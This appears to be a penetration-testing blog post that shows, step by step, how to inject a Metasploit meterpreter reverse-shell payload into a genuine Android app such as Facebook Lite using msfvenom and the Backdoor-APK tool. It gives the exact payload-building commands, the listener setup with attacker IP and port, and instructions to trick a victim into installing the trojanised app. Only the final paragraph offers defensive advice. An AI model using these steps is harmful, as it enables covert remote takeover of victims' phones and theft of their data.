---
layout: post
title: Injecting Backdoor in Android Application (APK)
category: Pentest
tags: apktool msfvenom backdoor-apk meterpreter
---

Lets assuming that we have created an APK with reverse shell payload and somehow installed it on victim's phone, which upon execution would establish a direct connection to the victim's phone.

Since the generated APK only contains the payload that doesn't do anything when clicked and even the size would be in KB's which looks very much suspicious and the victim would uninstall it immediately or doesn't even install it.

In order to make the app look legit, we would inject our meterperter reverse shell payload in genuine android apps like facebook, adobe reader, whatsapp. This way the app appears to be legit which the victim installs and gets what he expected... we get the shell..:-)



----

### Prerequisites:
<ul>
<li>In this article, we'd be using 64bit kali linux to build our backdoored APK. Before we start make sure below listed packages are being installed in the machine, if not execute below command from the terminal:
{% highlight python %}
apt-get install lib32stdc++6 lib32ncurses5 lib32z1
{% endhighlight %} </li>
<img src="{{ site.baseurl }}/public/android01.jpg">

<li>Apktool, this utility does come with kali linux if not check and update it. To install/update "apktool" following the instruction  <a href="https://ibotpeaches.github.io/Apktool/install/" target="_blank">@ibotpeaches</a>
{% highlight python %}
apktool -v    #Check apktool version
{% endhighlight %} </li>
</ul>


----

### Ways to Inject an Android APK File

<div class="message">
Ther are different ways to inject our backdoor into an APK, we'll be using below listed utilities to build our malicious APK allowing an attacker to compromise victim's phone remotely
<ul>
<li>MSFvenom</li>
<li>Backdoor-APK</li>
</ul>
</div>

<strong> Injecting Payload with msfveom </strong>

Assuming we already have a downloaded android apk, we use it as a template to inject our reverse shell. Below command would allow us to inject the backdoor into original apk, which upon execution connects back to the IP specified within the payload.

{% highlight python %}
msfvenom --platform android -x facebook_lite.apk -p android/meterpreter/reverse_tcp LHOST=192.168.11.187 LPORT=4444 -o facebook_lite_bc.apk
{% endhighlight %}
<img src="{{ site.baseurl }}/public/fblite01.jpg">


Now that we have our APK ready with the injected reverse shell payload, all you have to do is send the file to the victim and trick him to install the app.

<img src="{{ site.baseurl }}/public/f00.jpg">
<img src="{{ site.baseurl }}/public/f01.jpg">

On the other hand keep the listener ready for the incoming connection using metasploit exploit/multi/handler. Once the victim installs and opens the app we would get a shell spawned.


<img src="{{ site.baseurl }}/public/shell01.jpg">



----
<strong> Injecting Payload with "Backdoor-APK" </strong>

Another utility that can be used in backdooring an android app is "Backdoor-APK". Behind the scene, this utility uses "msfvenom" and does the same by automating the process making it much easier to inject the payload into android APK and can be downloaded from github repository.
{% highlight python %}
git clone https://github.com/dana-at-cp/backdoor-apk.git
{% endhighlight %}
<img src="{{ site.baseurl }}/public/bc01.jpg">



Having the downloaded Original APK and Backdoor-APK in same folder, execute the below command in the terminal which will prompt you to select the payload and details of the connect back IP and Port.
{% highlight python %}
./backdoor-apk.sh facebook_lite.apk
{% endhighlight %}
<img src="{{ site.baseurl }}/public/bc02.jpg">


Once the required details are been provided, utility start injecting the reverse shell payload within the APK.

<img src="{{ site.baseurl }}/public/bc03.jpg">

On the other hand start the listener for incoming connection using metasploit multi handler.
{% highlight python %}
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set lhost 192.168.11.187
set lport 4444
exploit
{% endhighlight %}

As expected we would have our final backdoored APK ready in "backdoor-apk -> original -> dist" folder, which we send to the victim and trick him to install it.

<img src="{{ site.baseurl }}/public/bc04.jpg">


Once the victim installs and opens the app we would receive a meterpreter session.

<img src="{{ site.baseurl }}/public/f02.jpg">
----


### Conclusion

Its is highly recommended to not to download and install apps from unknown sources and never enable the option "install from unkown sources" under "Setting -> Security".
Install proper antivirus and make sure you never download or click url's from unkown sources.

----
